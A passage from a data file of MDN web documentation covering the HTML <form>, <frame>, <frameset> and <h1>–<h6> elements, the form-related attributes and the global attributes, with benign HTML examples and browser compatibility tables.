effects](https://developer.mozilla.org/en-US/docs/Glossary/Idempotent).\n- `dialog`: When the form is inside a [`<dialog>`](dialog), closes the dialog and causes a `submit` event to be fired on submission, without submitting data or clearing the form.\n\nThis value is overridden by [`formmethod`](button#formmethod) attributes on [`<button>`](button), [`<input type=\"submit\">`](input/submit), or [`<input type=\"image\">`](input/image) elements.\n\n[`novalidate`](#novalidate)  \nThis Boolean attribute indicates that the form shouldn't be validated when submitted. If this attribute is not set (and therefore the form ***is*** validated), it can be overridden by a [`formnovalidate`](button#formnovalidate) attribute on a [`<button>`](button), [`<input type=\"submit\">`](input/submit), or [`<input type=\"image\">`](input/image) element belonging to the form.\n\n[`target`](#target)  \nIndicates where to display the response after submitting the form. It is a name/keyword for a *browsing context* (for example, tab, window, or iframe). The following keywords have special meanings:\n\n- `_self` (default): Load into the same browsing context as the current one.\n- `_blank`: Load into a new unnamed browsing context. This provides the same behavior as setting [`rel=\"noopener\"`](#rel) which does not set [`window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener).\n- `_parent`: Load into the parent browsing context of the current one. If no parent, behaves the same as `_self`.\n- `_top`: Load into the top-level browsing context (i.e., the browsing context that is an ancestor of the current one and has no parent). If no parent, behaves the same as `_self`.\n- `_unfencedTop`: Load the response from a form inside an embedded [fenced frame](https://developer.mozilla.org/en-US/docs/Web/API/Fenced_frame_API) into the top-level frame (i.e., traversing beyond the root of the fenced frame, unlike other reserved destinations). Only available inside fenced frames.\n\nThis value can be overridden by a [`formtarget`](button#formtarget) attribute on a [`<button>`](button), [`<input type=\"submit\">`](input/submit), or [`<input type=\"image\">`](input/image) element.\n\n## Examples\n\nhtml\n\n```\n<!-- Form which will send a GET request to the current URL -->\n<form method=\"get\">\n  <label>\n    Name:\n    <input name=\"submitted-name\" autocomplete=\"name\" />\n  </label>\n  <button>Save</button>\n</form>\n\n<!-- Form which will send a POST request to the current URL -->\n<form method=\"post\">\n  <label>\n    Name:\n    <input name=\"submitted-name\" autocomplete=\"name\" />\n  </label>\n  <button>Save</button>\n</form>\n\n<!-- Form with fieldset, legend, and label -->\n<form method=\"post\">\n  <fieldset>\n    <legend>Do you agree to the terms?</legend>\n    <label><input type=\"radio\" name=\"radio\" value=\"yes\" /> Yes</label>\n    <label><input type=\"radio\" name=\"radio\" value=\"no\" /> No</label>\n  </fieldset>\n</form>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                                                       |\n|---------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [palpable content](../content_categories#palpable_content)                                                                                                                                                                                        |\n| Permitted content                           | [Flow content](../content_categories#flow_content), but not containing `<form>` elements                                                                                                                                                                                                              |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                                                                 |\n| Permitted parents                           | Any element that accepts [flow content](../content_categories#flow_content)                                                                                                                                                                                                                           |\n| Implicit ARIA role                          | [`form`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/form_role)                                                                                                                                                                                                             |\n| Permitted ARIA roles                        | [`search`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role), [`none`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/none_role) or [`presentation`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/presentation_role) |\n| DOM interface                               | [`HTMLFormElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement)                                                                                                                                                                                                                 |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms)\n- Other elements that are used when creating forms: [`<button>`](button), [`<datalist>`](datalist), [`<fieldset>`](fieldset), [`<input>`](input), [`<label>`](label), [`<legend>`](legend), [`<meter>`](meter), [`<optgroup>`](optgroup), [`<option>`](option), [`<output>`](output), [`<progress>`](progress), [`<select>`](select), [`<textarea>`](textarea).\n- Getting a list of the elements in the form: [`HTMLFormElement.elements`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements)\n- [ARIA: Form role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/form_role)\n- [ARIA: Search role](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/search_role)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form)"
- name: form (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`form`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/form)

    [`<button>`](element/button), [`<fieldset>`](element/fieldset), [`<input>`](element/input), [`<label>`](element/label), [`<meter>`](element/meter), [`<object>`](element/object), [`<output>`](element/output), [`<progress>`](element/progress), [`<select>`](element/select), [`<textarea>`](element/textarea)

    Indicates the form that is the owner of the element.
- name: formaction (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`formaction`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/formaction)

    [`<input>`](element/input), [`<button>`](element/button)

    Indicates the action of the element, overriding the action defined in the [`<form>`](element/form).
- name: formenctype (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`formenctype`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/formenctype)

    [`<button>`](element/button), [`<input>`](element/input)

    If the button/input is a [submit button](https://developer.mozilla.org/en-US/docs/Glossary/Submit_button) (e.g. `type="submit"`), this attribute sets the encoding type to use during form submission. If this attribute is specified, it overrides the `enctype` attribute of the button's [form](element/form) owner.
- name: formmethod (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`formmethod`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/formmethod)

    [`<button>`](element/button), [`<input>`](element/input)

    If the button/input is a [submit button](https://developer.mozilla.org/en-US/docs/Glossary/Submit_button) (e.g. `type="submit"`), this attribute sets the submission method to use during form submission (`GET`, `POST`, etc.). If this attribute is specified, it overrides the `method` attribute of the button's [form](element/form) owner.
- name: formnovalidate (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`formnovalidate`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/formnovalidate)

    [`<button>`](element/button), [`<input>`](element/input)

    If the button/input is a [submit button](https://developer.mozilla.org/en-US/docs/Glossary/Submit_button) (e.g. `type="submit"`), this boolean attribute specifies that the form is not to be validated when it is submitted. If this attribute is specified, it overrides the `novalidate` attribute of the button's [form](element/form) owner.
- name: formtarget (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`formtarget`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/formtarget)

    [`<button>`](element/button), [`<input>`](element/input)

    If the button/input is a [submit button](https://developer.mozilla.org/en-US/docs/Glossary/Submit_button) (e.g. `type="submit"`), this attribute specifies the browsing context (for example, tab, window, or inline frame) in which to display the response that is received after submitting the form. If this attribute is specified, it overrides the `target` attribute of the button's [form](element/form) owner.
- name: frame
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<frame\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<frame>` [HTML](../index) element defines a particular area in which another HTML document can be displayed. A frame should be used within a [`<frameset>`](frameset).\n\nUsing the `<frame>` element is not encouraged because of certain disadvantages such as performance problems and lack of accessibility for users with screen readers. Instead of the `<frame>` element, [`<iframe>`](iframe) may be preferred.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`src`](#src) Deprecated  \nThis attribute specifies the document that will be displayed by the frame.\n\n[`name`](#name) Deprecated  \nThis attribute is used for labeling frames. Without labeling, every link will open in the frame that it's in – the closest parent frame. See the [`target`](a#target) attribute for more information.\n\n[`noresize`](#noresize) Deprecated  \nThis attribute prevents resizing of frames by users.\n\n[`scrolling`](#scrolling) Deprecated  \nThis attribute defines the existence of a scrollbar. If this attribute is not used, the browser adds a scrollbar when necessary. There are two choices: \"yes\" for forcing a scrollbar even when it is not necessary and \"no\" for forcing no scrollbar even when it *is* necessary.\n\n[`marginheight`](#marginheight) Deprecated  \nThis attribute defines the height of the margin between frames.\n\n[`marginwidth`](#marginwidth) Deprecated  \nThis attribute defines the width of the margin between frames.\n\n[`frameborder`](#frameborder) Deprecated  \nThis attribute allows you to specify a frame's border.\n\n## Example\n\n### A frameset document\n\nA frameset document has a [`<frameset>`](frameset) element instead of a [`<body>`](body) element. The `<frame>` elements are placed within the `<frameset>`.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <!-- Document metadata goes here -->\n  </head>\n  <frameset cols=\"400, 500\">\n    <frame src=\"https://developer.mozilla.org/en/HTML/Element/iframe\" />\n    <frame src=\"https://developer.mozilla.org/en/HTML/Element/frame\" />\n  </frameset>\n</html>\n```\n\nIf you want to embed another HTML page into the [`<body>`](body) of a document, use an [`<iframe>`](iframe) element.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|                | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|----------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|                | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `frame`        | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `frameborder`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `marginheight` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `marginwidth`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `name`         | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `noresize`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `scrolling`    | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `src`          | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<frameset>`](frameset)\n- [`<iframe>`](iframe)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)"
- name: frameset
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<frameset\\>\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<frameset>` [HTML](../index) element is used to contain [`<frame>`](frame) elements.\n\n**Note:** Because the use of frames is now discouraged in favor of using [`<iframe>`](iframe), this element is not typically used by modern websites.\n\n## Attributes\n\nLike all other HTML elements, this element supports the [global attributes](../global_attributes).\n\n[`cols`](#cols) Deprecated  \nThis attribute specifies the number and size of horizontal spaces in a frameset.\n\n[`rows`](#rows) Deprecated  \nThis attribute specifies the number and size of vertical spaces in a frameset.\n\n## Example\n\n### A frameset document\n\nA frameset document has a `<frameset>` element instead of a [`<body>`](body) element. The [`<frame>`](frame) elements are placed within the `<frameset>`.\n\nhtml\n\n```\n<!doctype html>\n<html lang=\"en-US\">\n  <head>\n    <!-- Document metadata goes here -->\n  </head>\n  <frameset cols=\"50%, 50%\">\n    <frame\n      src=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe\" />\n    <frame\n      src=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame\" />\n  </frameset>\n</html>\n```\n\nIf you want to embed another HTML page into the [`<body>`](body) of a document, use an [`<iframe>`](iframe) element.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `frameset` | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `cols`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `rows`     | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<frame>`](frame)\n- [`<iframe>`](iframe)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frameset](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frameset)"
- name: Global attributes
  summary: Global attributes are attributes common to all HTML elements; they can be used on all elements, though they may have no effect on some elements
  description: "# Global attributes\n\n**Global attributes** are attributes common to all HTML elements; they can be used on all elements, though they may have no effect on some elements.\n\nGlobal attributes may be specified on all [HTML elements](element), *even those not specified in the standard*. That means that any non-standard elements must still permit these attributes, even though using those elements means that the document is no longer HTML5-compliant. For example, HTML5-compliant browsers hide content marked as `<foo hidden>…</foo>`, even though `<foo>` is not a valid HTML element.\n\nIn addition to the basic HTML global attributes, the following global attributes also exist:\n\n- `xml:lang` and `xml:base` — these are inherited from the XHTML specifications and deprecated, but kept for compatibility purposes.\n- The ARIA [`role`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles) attribute and the multiple [`aria-*`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes) states and properties, used for ensuring accessibility.\n- The [event handler](attributes#event_handler_attributes) attributes: `onabort`, `onautocomplete`, `onautocompleteerror`, `onblur`, `oncancel`, `oncanplay`, `oncanplaythrough`, `onchange`, `onclick`, `onclose`, `oncontextmenu`, `oncuechange`, `ondblclick`, `ondrag`, `ondragend`, `ondragenter`, `ondragleave`, `ondragover`, `ondragstart`, `ondrop`, `ondurationchange`, `onemptied`, `onended`, `onerror`, `onfocus`, `oninput`, `oninvalid`, `onkeydown`, `onkeypress`, `onkeyup`, `onload`, `onloadeddata`, `onloadedmetadata`, `onloadstart`, `onmousedown`, `onmouseenter`, `onmouseleave`, `onmousemove`, `onmouseout`, `onmouseover`, `onmouseup`, `onmousewheel`, `onpause`, `onplay`, `onplaying`, `onprogress`, `onratechange`, `onreset`, `onresize`, `onscroll`, `onseeked`, `onseeking`, `onselect`, `onshow`, `onsort`, `onstalled`, `onsubmit`, `onsuspend`, `ontimeupdate`, `ontoggle`, `onvolumechange`, `onwaiting`.\n\n## List of global attributes\n\n[`accesskey`](global_attributes/accesskey)  \nProvides a hint for generating a keyboard shortcut for the current element. This attribute consists of a space-separated list of characters. The browser should use the first one that exists on the computer keyboard layout.\n\n[`anchor`](global_attributes/anchor) Non-standard  \nAssociates a positioned element with an anchor element. The attribute's value is the [`id`](global_attributes/id) value of the element you want to anchor the positioned element to. The element can then be positioned [using CSS anchor positioning](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_anchor_positioning/Using).\n\n[`autocapitalize`](global_attributes/autocapitalize)  \nControls whether inputted text is automatically capitalized and, if so, in what manner.\n\n[`autofocus`](global_attributes/autofocus)  \nIndicates that an element is to be focused on page load, or as soon as the [`<dialog>`](element/dialog) it is part of is displayed. This attribute is a boolean, initially false.\n\n[`class`](global_attributes/class)  \nA space-separated list of the classes of the element. Classes allow CSS and JavaScript to select and access specific elements via the [class selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Class_selectors) or functions like the method [`Document.getElementsByClassName()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName).\n\n[`contenteditable`](global_attributes/contenteditable)  \nAn [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute indicating if the element should be editable by the user. If so, the browser modifies its widget to allow editing. The attribute must take one of the following values:\n\n- `true` or the *empty string*, which indicates that the element must be editable;\n- `false`, which indicates that the element must not be editable.\n- `plaintext-only`, which indicates the element's raw text is editable, but rich text formatting is disabled.\n\n[`data-*`](global_attributes/data-*)  \nForms a class of attributes, called custom data attributes, that allow proprietary information to be exchanged between the [HTML](index) and its [DOM](https://developer.mozilla.org/en-US/docs/Glossary/DOM) representation that may be used by scripts. All such custom data are available via the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface of the element the attribute is set on. The [`HTMLElement.dataset`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dataset) property gives access to them.\n\n[`dir`](global_attributes/dir)  \nAn enumerated attribute indicating the directionality of the element's text. It can have the following values:\n\n- `ltr`, which means *left to right* and is to be used for languages that are written from the left to the right (like English);\n- `rtl`, which means *right to left* and is to be used for languages that are written from the right to the left (like Arabic);\n- `auto`, which lets the user agent decide. It uses a basic algorithm as it parses the characters inside the element until it finds a character with a strong directionality, then it applies that directionality to the whole element.\n\n[`draggable`](global_attributes/draggable)  \nAn enumerated attribute indicating whether the element can be dragged, using the [Drag and Drop API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API). It can have the following values:\n\n- `true`, which indicates that the element may be dragged\n- `false`, which indicates that the element may not be dragged.\n\n[`enterkeyhint`](global_attributes/enterkeyhint)  \nHints what action label (or icon) to present for the enter key on virtual keyboards.\n\n[`exportparts`](global_attributes/exportparts)  \nUsed to transitively export shadow parts from a nested shadow tree into a containing light tree.\n\n[`hidden`](global_attributes/hidden)  \nAn enumerated attribute indicating that the element is not yet, or is no longer, *relevant*. For example, it can be used to hide elements of the page that can't be used until the login process has been completed. The browser won't render such elements. This attribute must not be used to hide content that could legitimately be shown.\n\n[`id`](global_attributes/id)  \nDefines a unique identifier (ID) which must be unique in the whole document. Its purpose is to identify the element when linking (using a fragment identifier), scripting, or styling (with CSS).\n\n[`inert`](global_attributes/inert)  \nA boolean value that makes the browser disregard user input events for the element. Useful when click events are present.\n\n[`inputmode`](global_attributes/inputmode)  \nProvides a hint to browsers about the type of virtual keyboard configuration to use when editing this element or its contents. Used primarily on [`<input>`](element/input) elements, but is usable on any element while in [`contenteditable`](#contenteditable) mode.\n\n[`is`](global_attributes/is)  \nAllows you to specify that a standard HTML element should behave like a registered custom built-in element (see [Using custom elements](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_custom_elements) for more details).\n\n**Note:** The `item*` attributes are part of the [WHATWG HTML Microdata feature](https://html.spec.whatwg.org/multipage/microdata.html#microdata).\n\n[`itemid`](global_attributes/itemid)  \nThe unique, global identifier of an item.\n\n[`itemprop`](global_attributes/itemprop)  \nUsed to add properties to an item. Every HTML element may have an `itemprop` attribute specified, where an `itemprop` consists of a name and value pair.\n\n[`itemref`](global_attributes/itemref)  \nProperties that are not descendants of an element with the `itemscope` attribute can be associated with the item using an `itemref`. It provides a list of element ids (not `itemid`s) with additional properties elsewhere in the document.\n\n[`itemscope`](global_attributes/itemscope)  \n`itemscope` (usually) works along with [`itemtype`](global_attributes/itemtype) to specify that the HTML contained in a block is about a particular item. `itemscope` creates the Item and defines the scope of the `itemtype` associated with it. `itemtype` is a valid URL of a vocabulary (such as [schema.org](https://schema.org/)) that describes the item and its properties context.\n\n[`itemtype`](global_attributes/itemtype)  \nSpecifies the URL of the vocabulary that will be used to define `itemprop`s (item properties) in the data structure. [`itemscope`](global_attributes/itemscope) is used to set the scope of where in the data structure the vocabulary set by `itemtype` will be active.\n\n[`lang`](global_attributes/lang)  \nHelps define the language of an element: the language that non-editable elements are in, or the language that editable elements should be written in by the user. The attribute contains one \"language tag\" (made of hyphen-separated \"language subtags\") in the format defined in [RFC 5646: Tags for Identifying Languages (also known as BCP 47)](https://datatracker.ietf.org/doc/html/rfc5646). `xml:lang` has priority over it.\n\n[`nonce`](global_attributes/nonce)  \nA cryptographic nonce (\"number used once\") which can be used by [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) to determine whether or not a given fetch will be allowed to proceed.\n\n[`part`](global_attributes/part)  \nA space-separated list of the part names of the element. Part names allows CSS to select and style specific elements in a shadow tree via the [`::part`](https://developer.mozilla.org/en-US/docs/Web/CSS/::part) pseudo-element.\n\n[`popover`](global_attributes/popover)  \nUsed to designate an element as a popover element (see [Popover API](https://developer.mozilla.org/en-US/docs/Web/API/Popover_API)). Popover elements are hidden via `display: none` until opened via an invoking/control element (i.e. a `<button>` or `<input type=\"button\">` with a [`popovertarget`](element/button#popovertarget) attribute) or a [`HTMLElement.showPopover()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/showPopover) call.\n\n[`role`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles)  \nRoles define the semantic meaning of content, allowing screen readers and other tools to present and support interaction with an object in a way that is consistent with user expectations of that type of object. `roles` are added to HTML elements using `role=\"role_type\"`, where `role_type` is the name of a role in the ARIA specification.\n\n[`slot`](global_attributes/slot)  \nAssigns a slot in a [shadow DOM](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM) shadow tree to an element: An element with a `slot` attribute is assigned to the slot created by the [`<slot>`](element/slot) element whose [`name`](element/slot#name) attribute's value matches that `slot` attribute's value.\n\n[`spellcheck`](global_attributes/spellcheck)  \nAn enumerated attribute defines whether the element may be checked for spelling errors. It may have the following values:\n\n- empty string or `true`, which indicates that the element should be, if possible, checked for spelling errors;\n- `false`, which indicates that the element should not be checked for spelling errors.\n\n[`style`](global_attributes/style)  \nContains [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) styling declarations to be applied to the element. Note that it is recommended for styles to be defined in a separate file or files. This attribute and the [`<style>`](element/style) element have mainly the purpose of allowing for quick styling, for example for testing purposes.\n\n[`tabindex`](global_attributes/tabindex)  \nAn integer attribute indicating if the element can take input focus (is *focusable*), if it should participate to sequential keyboard navigation, and if so, at what position. It can take several values:\n\n- a *negative value* means that the element should be focusable, but should not be reachable via sequential keyboard navigation;\n- `0` means that the element should be focusable and reachable via sequential keyboard navigation, but its relative order is defined by the platform convention;\n- a *positive value* means that the element should be focusable and reachable via sequential keyboard navigation; the order in which the elements are focused is the increasing value of the [**tabindex**](#tabindex). If several elements share the same tabindex, their relative order follows their relative positions in the document.\n\n[`title`](global_attributes/title)  \nContains a text representing advisory information related to the element it belongs to. Such information can typically, but not necessarily, be presented to the user as a tooltip.\n\n[`translate`](global_attributes/translate)  \nAn enumerated attribute that is used to specify whether an element's attribute values and the values of its [`Text`](https://developer.mozilla.org/en-US/docs/Web/API/Text) node children are to be translated when the page is localized, or whether to leave them unchanged. It can have the following values:\n\n- empty string or `yes`, which indicates that the element will be translated.\n- `no`, which indicates that the element will not be translated.\n\n[`virtualkeyboardpolicy`](global_attributes/virtualkeyboardpolicy) Experimental  \nAn [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute used to control the on-screen virtual keyboard behavior on devices such as tablets, mobile phones, or other devices where a hardware keyboard may not be available for elements that its content is editable (for example, it is an [`<input>`](element/input) or [`<textarea>`](element/textarea) element, or an element with the [`contenteditable`](global_attributes/contenteditable) attribute set).\n\n- `auto` or an *empty string*, which automatically shows the virtual keyboard when the element is focused or tapped.\n- `manual`, which decouples focus and tap on the element from the virtual keyboard's state.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`Element`](https://developer.mozilla.org/en-US/docs/Web/API/Element) interface that allows querying most global attributes.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes)"
- name: h1
  summary: The <h1> to <h6> HTML elements represent six levels of section headings
  description: "# \\<h1\\>–\\<h6\\>: The HTML Section Heading elements\n\nThe `<h1>` to `<h6>` [HTML](../index) elements represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest. By default, all heading elements create a [block-level](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) box in the layout, starting on a new line and taking up the full width available in their containing block.\n\n## Try it\n\n#### HTML Demo: \\<h1-h6\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <h1>Beetles</h1>\n    <h2>External morphology</h2>\n    <h3>Head</h3>\n    <h4>Mouthparts</h4>\n    <h3>Thorax</h3>\n    <h4>Prothorax</h4>\n    <h4>Pterothorax</h4>\n\n    h1,\n    h2,\n    h3,\n    h4 {\n      margin: 0.1rem 0;\n    }\n\n    h1 {\n      font-size: 2rem;\n    }\n\n    h2 {\n      font-size: 1.5rem;\n      padding-left: 20px;\n    }\n\n    h3 {\n      font-size: 1.2rem;\n      padding-left: 40px;\n    }\n\n    h4 {\n      font-size: 1rem;\n      font-style: italic;\n      padding-left: 60px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThese elements only include the [global attributes](../global_attributes).\n\n## Usage notes\n\n- Heading information can be used by user agents to construct a table of contents for a document automatically.\n- Do not use heading elements to resize text. Instead, use the [CSS](https://developer.mozilla.org/en-US/docs/Glossary/CSS) [`font-size`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-size) property.\n- Do not skip heading levels: always start from `<h1>`, followed by `<h2>` and so on.\n\n### Avoid using multiple `<h1>` elements on one page\n\nWhile using multiple `<h1>` elements on one page is allowed by the HTML standard (as long as they are not [nested](#nesting)), this is not considered a best practice. A page should generally have a single `<h1>` element that describes the content of the page (similar to the document's [`<title>`](title) element).\n\n**Note:** Nesting multiple `<h1>` elements in nested [sectioning elements](../element#content_sectioning) was allowed in older versions of the HTML standard. However, this was never considered a best practice and is now non-conforming. Read more in [There Is No Document Outline Algorithm](https://adrianroselli.com/2016/08/there-is-no-document-outline-algorithm.html).\n\nPrefer using only one `<h1>` per page and [nest headings](#nesting) without skipping levels.\n\n## Accessibility\n\n### Navigation\n\nA common navigation technique for users of screen reading software is to quickly jump from heading to heading in order to determine the content of the page. Because of this, it is important to not skip one or more heading levels. Doing so may create confusion, as the person navigating this way may be left wondering where the missing heading is.\n\n**Don't do this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h3>Heading level 3</h3>\n<h4>Heading level 4</h4>\n```\n\n**Prefer this:**\n\nhtml\n\n```\n<h1>Heading level 1</h1>\n<h2>Heading level 2</h2>\n<h3>Heading level 3</h3>\n```\n\n#### Nesting\n\nHeadings may be nested as subsections to reflect the organization of the content of the page. Most screen readers can also generate an ordered list of all the headings on a page, which can help a person quickly determine the hierarchy of the content:\n\n1.  `h1` Beetles\n    1.  `h2` Etymology\n    2.  `h2` Distribution and Diversity\n    3.  `h2` Evolution\n        1.  `h3` Late Paleozoic\n        2.  `h3` Jurassic\n        3.  `h3` Cretaceous\n        4.  `h3` Cenozoic\n    4.  `h2` External Morphology\n        1.  `h3` Head\n            1.  `h4` Mouthparts\n        2.  `h3` Thorax\n            1.  `h4` Prothorax\n            2.  `h4` Pterothorax\n        3.  `h3` Legs\n        4.  `h3` Wings\n        5.  `h3` Abdomen\n\nWhen headings are nested, heading levels may be \"skipped\" when closing a subsection.\n\n- [Headings • Page Structure • WAI Web Accessibility Tutorials](https://www.w3.org/WAI/tutorials/page-structure/headings/)\n- [MDN Understanding WCAG, Guideline 1.3 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Perceivable#guideline_1.3_%E2%80%94_create_content_that_can_be_presented_in_different_ways)\n- [Understanding Success Criterion 1.3.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/content-structure-separation-programmatic.html)\n- [MDN Understanding WCAG, Guideline 2.4 explanations](https://developer.mozilla.org/en-US/docs/Web/Accessibility/Understanding_WCAG/Operable#guideline_2.4_%E2%80%94_navigable_provide_ways_to_help_users_navigate_find_content_and_determine_where_they_are)\n- [Understanding Success Criterion 2.4.1 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-skip.html)\n- [Understanding Success Criterion 2.4.6 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-descriptive.html)\n- [Understanding Success Criterion 2.4.10 \\| W3C Understanding WCAG 2.0](https://www.w3.org/TR/UNDERSTANDING-WCAG20/navigation-mechanisms-headings.html)\n\n### Labeling section content\n\nAnother common navigation technique for users of screen reading software is to generate a list of [sectioning content](../element#content_sectioning) and use it to determine the page's layout.\n\nSectioning content can be labeled using a combination of the [`aria-labelledby`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Attributes/aria-labelledby) and [`id`](../global_attributes#id) attributes, with the label concisely describing the purpose of the section. This technique is useful for situations where there is more than one sectioning element on the same 